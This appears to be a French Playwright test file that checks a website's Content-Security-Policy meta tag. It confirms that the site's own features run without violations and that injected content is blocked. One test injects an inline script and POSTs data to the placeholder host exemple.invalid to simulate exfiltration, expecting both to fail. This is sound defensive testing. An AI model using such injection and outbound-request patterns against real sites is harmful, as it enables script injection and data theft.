/**
 * Politique de sécurité du contenu (balise meta produite par Astro) : elle ne
 * doit rien bloquer de ce que le site fait lui-même, sur aucune page, ni
 * pendant le parcours complet du vérificateur, ni à l'impression.
 */
import { expect, test } from '@playwright/test';
import { PAGES_DU_SITE, SITE } from '../../src/content/site.ts';
import { allerAuRapport, cheminFixture, releverViolations } from './outils.ts';

test('chaque page : politique de sécurité en balise meta, aucune violation', async ({ page }) => {
  const violations = await releverViolations(page);
  for (const chemin of [...Object.values(PAGES_DU_SITE).map((p) => p.chemin), '/page-inexistante/']) {
    await page.goto(chemin);
    await page.waitForLoadState('networkidle');
    const politique = await page.locator('meta[http-equiv="content-security-policy"]').getAttribute('content');
    expect(politique, chemin).toContain("default-src 'self'");
    expect(politique, chemin).toContain("connect-src 'self' https://cloudflareinsights.com");
    // Seul le fichier exact de la balise est permis, pas tout le domaine de Cloudflare.
    expect(politique, chemin).toMatch(/script-src [^;]*https:\/\/static\.cloudflareinsights\.com\/beacon\.min\.js[ ;]/);
    expect(politique, chemin).toContain("object-src 'none'");
    expect(await violations(), chemin).toEqual([]);
  }
});

test('accueil : les zones surlignées de l’exemple restent placées (attributs style autorisés)', async ({ page }) => {
  const violations = await releverViolations(page);
  await page.goto('/');
  const zone = page.locator('.v-zone').first();
  await expect(zone).toBeVisible();
  // Sans l'attribut style, la zone n'aurait ni position ni taille.
  expect((await zone.boundingBox())?.width ?? 0).toBeGreaterThan(0);
  expect(await zone.evaluate((element) => element.style.left)).toMatch(/%$/);
  expect(await violations()).toEqual([]);
});

test('vérificateur : parcours complet, aperçus et impression sans violation', async ({ page }) => {
  const violations = await releverViolations(page);
  await allerAuRapport(page, { fichier: cheminFixture('04_marges_2cm_word.pdf') });
  // Aperçus des pages (adresses blob:) affichés, zones surlignées comprises.
  const apercu = page.locator('[data-regle="R08"] .v-apercu-page img');
  await expect(apercu).toHaveAttribute('src', /^blob:/);
  await expect(apercu).toBeVisible();
  expect(await apercu.evaluate((image) => (image as HTMLImageElement).naturalWidth)).toBeGreaterThan(0);
  await page.getByRole('checkbox').first().check();
  await page.emulateMedia({ media: 'print' });
  await expect(page.getByRole('heading', { name: 'Sources citées' })).toBeVisible();
  expect(await violations()).toEqual([]);
});

test('la politique est appliquée : un script en ligne imprévu et une requête vers un autre site sont bloqués', async ({ page }) => {
  const violations = await releverViolations(page);
  await page.goto(PAGES_DU_SITE.verifier.chemin);
  const resultat = await page.evaluate(async () => {
    const script = document.createElement('script');
    script.textContent = 'window.__injecte = true;';
    document.head.append(script);
    const envoi = await fetch('https://exemple.invalid/', { method: 'POST', body: 'dossier' }).then(
      () => 'envoyé',
      () => 'bloqué',
    );
    return { injecte: (window as unknown as { __injecte?: boolean }).__injecte ?? false, envoi };
  });
  expect(resultat).toEqual({ injecte: false, envoi: 'bloqué' });
  await expect.poll(async () => (await violations()).join('\n')).toMatch(/script-src/);
  await expect.poll(async () => (await violations()).join('\n')).toMatch(/connect-src/);
});

test('seul le fichier exact de la balise de statistiques peut s’exécuter : une balise ajoutée par Cloudflare est bloquée', async ({
  page,
}) => {
  const violations = await releverViolations(page);
  // Balise de la configuration automatique de Web Analytics, vue en ligne le 11/11/2026 (adresse versionnée).
  const ajoutee = `${SITE.statistiques.script}/vce701823e78c4301a35b7e07294d87301792088814092`;
  let demandee = false;
  await page.route(ajoutee, (route) => {
    demandee = true;
    return route.fulfill({ contentType: 'text/javascript', body: 'window.__ajoutee = true;' });
  });
  await page.goto(PAGES_DU_SITE.verifier.chemin);
  const chargee = await page.evaluate(async (adresse) => {
    const script = document.createElement('script');
    script.src = adresse;
    const fin = new Promise((resoudre) => script.addEventListener('error', resoudre, { once: true }));
    document.head.append(script);
    await Promise.race([fin, new Promise((resoudre) => setTimeout(resoudre, 2000))]);
    return (window as unknown as { __ajoutee?: boolean }).__ajoutee ?? false;
  }, ajoutee);
  expect(chargee).toBe(false);
  expect(demandee).toBe(false);
  await expect.poll(async () => (await violations()).join('\n')).toMatch(/script-src/);
});
